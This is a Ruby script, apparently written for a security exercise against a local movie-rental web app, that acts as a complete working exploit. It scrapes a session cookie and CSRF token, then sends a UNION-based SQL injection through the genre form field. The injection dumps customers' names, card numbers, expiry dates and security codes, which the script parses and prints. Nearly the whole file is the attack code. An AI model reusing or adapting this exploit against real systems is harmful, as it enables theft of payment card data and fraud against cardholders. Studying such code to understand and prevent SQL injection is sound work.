require "cgi"
require 'socket'

class CreditCard
	# Creates new credit card object with 5 pieces of information
	def initialize(name, num, mo, yr, code)
		@cardholder_name = name
		@card_number = num
		@expiration = mo + "/" + yr
		@security_code = code
	end

	# Prints out credit card information with labels
	def to_s
		"Cardholder: " + @cardholder_name + 
		"\nCardnumber: " + @card_number +
		"\nExpiration: " + @expiration +
		"\nSecurity Code: " + @security_code +
		"\n-------------------------------"
	end
end


class CreditCardHeist

	public

	def initialize(host, port)
		@@host=host
		@@port=port
		# An array containing all the stolen credit card, in the form of credit card objects
		@@stolenCreditCards = Array.new
	end

	# Displays the information about all stolen credit cards
	def displayCardInfo
		loadCardInfo
		@@stolenCreditCards.each do |card|
			puts card.to_s
		end
	end

	private

	# Organizes the raw response of the SQL injection and 
	# populates @@stolenCreditCards with information
	def loadCardInfo
		cardInfoPattern = /<a href="\/movies\/rent\/\d+">(.*)<\/a><\/td>\n\s*<td>([0-9]*)<\/td>\n\s*<td>([0-9]*)<\/td>\n\s*<td>([0-9]*)<\/td>\n\s*<td>([0-9]*)<\/td>/
		cardInfoHolder = extractCardInfo.scan(cardInfoPattern)
		# An array of arrays. Each array represents a credit card
		cardInfoHolder.each do |card|
			newCard = CreditCard.new(card[0], card[1], card[2], card[3], card[4])
			@@stolenCreditCards << newCard
		end
	end

	# Extracts credit card information from the website via
	# SQL injection in a POST request, and returns response
	def extractCardInfo
		secretInfo = getSecretInfo
		cookieNumber = secretInfo[:cookie]
		authToken = secretInfo[:authenticity_token]

		sqlInjection = "' AND 1=0 
			UNION SELECT id, name, card_number, exp_month, exp_year, security_code, billing_street 
			FROM customers 
			UNION SELECT * FROM movies 
			WHERE 1=0 AND genre='"
		request_body = "authenticity_token=" + CGI::escape(authToken) +
				"&genre=" + CGI::escape(sqlInjection) + "&commit=Show+Movies"

		http = Array.new
		http << "POST /movies/showGenre HTTP/1.1"
		http << "Content-Type: application/x-www-form-urlencoded"
		http << "Host: #{@@host}:#{@@port.to_s}"
		http << "Cookie: _session_id=#{cookieNumber}"
		http << "Connection: close"	#Close connection after response
		http << "Content-Length: #{request_body.size.to_s}"
		http << ""
		http << request_body
		request = http.join("\r\n") + "\r\n\r\n"

		socket = TCPSocket.open(@@host, @@port)
		socket.puts(request)	#Send request

		response = socket.read	#Read response
		socket.close			#Close socket

		return response
	end

	# Acquires session cookie and CSRF authenticity token by submitting
	# a GET request, and returns these items in a hash
	def getSecretInfo
		http = Array.new
		http << "GET /movies/selectGenre HTTP/1.1"
		http << "Content-Type: application/x-www-form-urlencoded"
		http << "Host: #{@@host}:#{@@port}"
		http << "Connection: close"	#Close connection after response
		request = http.join("\r\n") + "\r\n\r\n"

		socket = TCPSocket.open(@@host, @@port)
		socket.puts(request)	#Send request

		response = socket.read	#Read response
		socket.close			#Close socket
		result = Hash.new
		result[:cookie] = (response =~ /^Set-Cookie: _session_id=([a-zA-Z0-9]*);/) ? $1 : nil
		result[:authenticity_token] = (response =~ /<input name=['"]authenticity_token['"] type=['"]hidden['"] value=['"](.*)['"]/) ? $1 : nil
		return result
	end


end

heist = CreditCardHeist.new("localhost", 3000)
heist.displayCardInfo
